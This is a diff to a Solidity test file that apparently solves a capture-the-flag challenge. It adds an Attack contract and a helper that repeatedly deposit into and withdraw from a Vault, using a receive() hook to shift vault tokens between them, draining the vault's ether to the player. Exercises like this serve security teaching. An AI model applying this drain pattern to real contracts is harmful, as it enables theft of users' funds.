@@ -21,7 +21,7 @@ contract ChallengeTest is Test {
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
-
+        new Attack(address (setup.vault())).attack{value:1 ether}();
         ////////// YOUR CODE END //////////
 
         assertTrue(setup.isSolved(), "challenge not solved");
@@ -33,5 +33,49 @@ contract ChallengeTest is Test {
 }
 
 ////////// YOUR CODE GOES HERE //////////
+contract Attack{
+    Vault c_vault;
+    AttackerSub sub;
+
+    constructor(address vaultaddress){
+        c_vault=Vault(vaultaddress);
+        sub=new AttackerSub(vaultaddress);
+    }
+
+    function attack() public payable{
+        while (true){
+            if (address(this).balance>address(c_vault).balance) break;
+            c_vault.deposit{value:address(this).balance}();
+            c_vault.withdrawAll();
+            sub.subattack();
+        }
+        c_vault.deposit{value:address(c_vault).balance}();
+        c_vault.withdrawAll();
+        sub.subattack();
+        (bool success,)=msg.sender.call{value:address(this).balance}("");
+        require(success);
+
+    }
+
+    receive() external payable{
+
+       c_vault.vaultToken().transfer(address(sub), c_vault.vaultToken().balanceOf(address(this)));
+    }
+}
+
+contract AttackerSub{
+    Vault c_vault;
+    constructor(address vaultaddress) {
+        c_vault=Vault(vaultaddress);
+
+    }
+    function subattack() public{
+        c_vault.withdrawAll();
+        (bool success,)=msg.sender.call{value:address(this).balance}("");
+        require(success);
+
+    }
+    receive() external payable{}
+}
 
 ////////// YOUR CODE END //////////
